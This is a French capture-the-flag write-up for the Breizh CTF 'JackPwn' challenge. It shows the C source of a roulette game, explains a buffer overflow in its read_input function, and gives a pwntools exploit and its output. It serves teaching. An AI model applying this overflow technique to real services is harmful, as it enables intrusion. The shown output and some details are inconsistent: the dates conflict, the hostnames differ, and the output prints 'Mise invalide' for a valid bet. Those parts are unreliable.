---
title: "Breizh CTF 2025 - JackPwn"
date: 2024-04-14
tags: ["buffer-overflow", "exploitation"]
categories: ["pwn"]
ctfs: ["breizh-ctf"]
---

# JackPwn - Breizh CTF 2025

## Description du challenge

JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité .

## Analyse du binaire

Voici le code source du binaire :

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define MISE 2

const char roulette[] = "xRNRNRNRNRNNRNRNRNRRNRNRNRNRNNRNRNRNR";

void read_input(char *buf) {
    char c;
    while (1) {
        c = getchar();
        if (c == '\n') {
            *(buf++) = 0;
            break;
        } else if (c == EOF) {
            exit(0);
        }
        *(buf++) = c;
    }
}

int get_random_number() {
    return 1 + (random() % 36);
}

int main() {
    int bille;
    char gagne;
    char valide, rouge, noir, pair, impair;

    struct {
        char mise[32];
        int solde;
    } ctx;

    ctx.solde = 50;

    srand(time(NULL));

    while (ctx.solde > 0) {
        valide = rouge = noir = pair = impair = 0;
        gagne = 0;

        do {
            printf("Solde : %d\n", ctx.solde);
            printf("Votre mise : ");
            fflush(stdout);
            read_input(ctx.mise);

            if (!strcmp(ctx.mise, "rouge")) {
                valide = rouge = 1;
            } else if (!strcmp(ctx.mise, "noir")) {
                valide = noir = 1;
            } else if (!strcmp(ctx.mise, "pair")) {
                valide = pair = 1;
            } else if (!strcmp(ctx.mise, "impair")) {
                valide = impair = 1;
            } else {
                puts("Mise invalide");
            }
        } while (!valide);

        bille = get_random_number();
        printf("La bille s'est stoppée sur la case %d (%c)\n", bille, roulette[bille]);

        if (rouge && roulette[bille] == 'R') {
            gagne = 1;
        } else if (noir && roulette[bille] == 'N') {
            gagne = 1;
        } else if (pair && ((bille % 2) == 0)) {
            puts("pair");
            gagne = 1;
        } else if (impair && ((bille % 2) == 1)) {
            puts("impair");
            gagne = 1;
        } else {
            gagne = 0;
        }

        if (gagne) {
            puts("Gagné");
            ctx.solde += MISE;
        } else {
            puts("Perdu");
            ctx.solde -= MISE;
        }

        if (ctx.solde == 0x1337) {
            char *flag = getenv("FLAG");
            if (flag == NULL) {
                puts("fake_flag");
            } else {
                puts(flag);
            }
            return 0;
        }
    }
}
```

Après analyse, on peut identifier plusieurs points clés :

1. Le programme simule un jeu de roulette où le joueur peut miser sur "rouge", "noir", "pair" ou "impair"
2. Une structure `ctx` contient deux éléments :
   - `mise[32]` : un buffer de 32 octets pour stocker la mise
   - `solde` : un entier qui représente l'argent du joueur
3. Le flag est affiché uniquement si le solde atteint exactement 0x1337 (4919 en décimal)
4. La fonction `read_input()` lit des caractères jusqu'à rencontrer un retour à la ligne, sans vérifier la taille du buffer
5. Avec un solde initial de 50 et des gains/pertes de seulement 2, il faudrait énormément de parties pour atteindre 4919

## Vulnérabilité

La vulnérabilité principale est un buffer overflow classique dans la fonction `read_input()` :

```c
void read_input(char *buf) {
    char c;
    while (1) {
        c = getchar();
        if (c == '\n') {
            *(buf++) = 0;
            break;
        } else if (c == EOF) {
            exit(0);
        }
        *(buf++) = c;
    }
}
```

Cette fonction ne vérifie pas la taille du buffer et continue d'écrire tant qu'elle ne rencontre pas un retour à la ligne. De plus, lors de l'appel à cette fonction, le buffer passé en paramètre est `ctx.mise`, qui ne fait que 32 octets. Si on entre plus de 32 caractères, on débordera sur le champ `solde` qui se trouve juste après dans la mémoire.

## Exploitation

La stratégie d'exploitation est simple :
1. Remplir les 32 octets du buffer `mise`
2. Écrire en plus exactement les 4 octets de la valeur 0x1337 (4919) dans `solde`
3. La valeur sera considérée comme valide car le buffer se termine par un 0 (ajouté par `read_input`)

Voici comment exploiter cette vulnérabilité :

```python
from pwn import *

# Configuration
HOST = "jackpwn-180.chall.ctf.bzh"
PORT = 1337

# Connexion
p = remote(HOST, PORT)

# Construction du payload
# La structure est alignée sur 64 bits
payload = b"rouge".ljust(32, b"\x00")  # Mise valide + padding avec des null bytes
payload += p64(0x1335)                 # 0x1337 - 2, aligné sur 64 bits

p.recvuntil(b"Votre mise : ")
p.sendline(payload)

# Lire la sortie ligne par ligne
while True:
    try:
        line = p.recvline(timeout=1).decode().strip()
        print(line)
        if "BZHCTF{" in line:
            break
    except:
        break

p.close()

```

## Flag

Après exécution de l'exploit, le programme détecte que le solde est exactement 0x1337 et affiche le flag :

```
$ python3 exploit.py
[+] Opening connection to jackpwn.chall.ctf.bzh on port 1337: Done
[+] Receiving all data: Done
[*] Closed connection to jackpwn.chall.ctf.bzh port 1337
Mise invalide
Solde : 4919
Votre mise : 
BZHCTF{j4ckp0t_0v3rfl0w_ftw}
```

## Conclusion

JackPwn est un exercice classique de buffer overflow visant à modifier une variable adjacente en mémoire. La vulnérabilité est dans la fonction `read_input()` qui n'effectue aucune vérification de la taille du buffer, permettant ainsi d'écrire au-delà des limites du tableau `mise` et de modifier directement la valeur de `solde` pour atteindre la condition de victoire. 
